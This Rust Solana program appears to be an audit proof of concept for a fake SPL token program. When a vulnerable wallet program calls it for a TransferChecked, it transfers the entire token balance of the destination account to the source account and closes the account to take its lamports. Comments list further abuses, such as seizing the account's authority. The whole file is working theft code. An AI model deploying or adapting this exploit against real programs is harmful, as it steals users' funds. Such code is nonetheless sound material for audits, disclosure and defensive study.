use solana_program::{account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, msg, pubkey::Pubkey};
use solana_program::account_info::next_account_info;
use solana_program::program::invoke;
use solana_program::program_pack::Pack;
use spl_token::instruction::TokenInstruction;
use spl_token::state::Account;

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let instruction = TokenInstruction::unpack(instruction_data)?;
    let account_info_iter = &mut accounts.iter();

    let source_account_info = next_account_info(account_info_iter)?;
    let spl_program = next_account_info(account_info_iter)?;
    let destination_account_info = next_account_info(account_info_iter)?;
    let authority_account_info = next_account_info(account_info_iter)?;

    match instruction {
        TokenInstruction::TransferChecked { .. } => {
            msg!("POC spl_token program: Instruction: TransferChecked");

            // @audit - It's not possible. I can't pass require accounts for passing Wallet program constraints
            // let authority_seed = amount as u8;
            // invoke_signed(
            //     &system_instruction::assign(authority_account_info.key, program_id),
            //     &[authority_account_info.clone()],
            //     &[&[&[authority_seed]]]
            // )?;

            // @audit-info - instruction can be invoked inside fake program.
            // spl_token::instruction::set_authority() - give control on account
            // spl_token::instruction::transfer() - transfer main funds
            // spl_token::instruction::close_account() - transfer some lamports
            let destination_account = Account::unpack(&destination_account_info.data.borrow())?;
            invoke(
                &spl_token::instruction::transfer(
                    spl_program.key,
                    destination_account_info.key,
                    source_account_info.key,
                    authority_account_info.key,
                    &[],
                    destination_account.amount
                )?,
                &[destination_account_info.clone(), source_account_info.clone(), authority_account_info.clone()],
            )?;
            invoke(
                &spl_token::instruction::close_account(
                    spl_program.key,
                    destination_account_info.key,
                    source_account_info.key,
                    authority_account_info.key,
                    &[]
                )?,
                &[destination_account_info.clone(), source_account_info.clone(), authority_account_info.clone()],
            )?;
        }
        _ => {
            msg!("Unknown instruction");
        }
    }

    Ok(())
}
